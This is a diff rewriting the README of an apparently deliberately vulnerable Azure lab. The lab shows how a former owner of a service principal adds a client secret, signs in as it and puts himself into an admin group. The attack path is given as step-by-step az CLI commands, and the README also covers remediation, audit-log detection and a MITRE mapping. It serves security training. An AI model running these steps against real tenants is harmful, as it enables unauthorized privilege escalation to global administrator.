@@ -1,19 +1,82 @@
-# Vulnerable Application Information
-In this vulnerable application, a user named "norightsuser" has been created. 
-At one point, this user held ownership over the "group-add-app" application. 
-However, due to a job transition, his ownership was revoked from the application registration. 
-Feeling discontent, he now intends to create disruption within the environment.
+# Add Service Principal Credentials
 
-In a somewhat oversight, the administrator only removed norightsuser's owner status from the application registration, overlooking his presence in the service principal. Could this oversight be exploited?
+**Difficulty:** Advanced | **Provider:** Azure | **Category:** Identity / Privilege Escalation
 
-This application has application permissions that enable the addition of members to groups. 
-Among these groups is "cred-administrators. Since our lack of Azure AD licenses prevents us from assigning roles to groups, it is necessary to assume that the "cred-administrators" group has been granted the "Global Administrators" role. 
-Consequently, if the attacker can manipulate the "group-add-app", he gains the ability to include himself in the Global Administrators group. 
-This is the primary objective of this application.
+## Scenario
 
+A user (`norightsuser`) was removed as owner of the `group-add-app` **application
+registration** after a job change. However, the administrator forgot to also remove them
+from the underlying **service principal** object. This is a common oversight — app
+registration ownership and service principal ownership are managed separately in Entra ID.
 
-## ⚠️ Warning
+The service principal has the **Group.ReadWrite.All** application permission. If an
+attacker can add credentials to the service principal and authenticate as it, they can add
+themselves to the `cred-administrators` group (which in a real environment would hold the
+Global Administrator role).
 
-**Important:** Details regarding the attack, safeguards, and methods for identifying this vulnerability, weakness, or misconfiguration are available in the PDF document.
+## Attack Path
 
----
+```
+[norightsuser] still owns the Service Principal
+    |
+    v
+az ad sp credential reset --append  -->  add new client secret
+    |
+    v
+az login --service-principal  (authenticate as SP)
+    |
+    v
+POST /v1.0/groups/<cred-administrators-id>/members/$ref
+    |
+    v
+norightsuser is now in the admin group
+```
+
+### Step 1 — Find the service principal you own
+
+```bash
+az ad sp list --show-mine --query "[].{name:displayName, id:id}"
+```
+
+### Step 2 — Add a new credential
+
+```bash
+az ad sp credential reset --id <sp-object-id> --append
+# Note the new appId, password, and tenant
+```
+
+### Step 3 — Authenticate as the service principal
+
+```bash
+az login --service-principal \
+  --username <appId> --password <password> --tenant <tenant>
+```
+
+### Step 4 — Add yourself to the admin group
+
+```bash
+# Get the group object ID
+az ad group show --group "cred-administrators" --query id -o tsv
+
+# Add norightsuser
+az ad group member add \
+  --group <group-id> \
+  --member-id <norightsuser-object-id>
+```
+
+## How to Fix in Production
+
+1. **Remove ownership from both the app registration AND the service principal** when
+   off-boarding. Use `az ad sp owner remove` in addition to `az ad app owner remove`.
+2. **Audit service principal ownership regularly**: `az ad sp list --all`.
+3. **Prefer managed identities** over service principals where possible — they have no
+   exportable credentials to steal or add.
+4. **Alert on `addServicePrincipalCredentials` events** in the Entra ID audit log.
+
+## MITRE ATT&CK Mapping
+
+| Technique | ID |
+|---|---|
+| Additional Cloud Credentials | T1098.001 |
+| Valid Accounts: Cloud Accounts | T1078.004 |
+| Account Manipulation | T1098 |
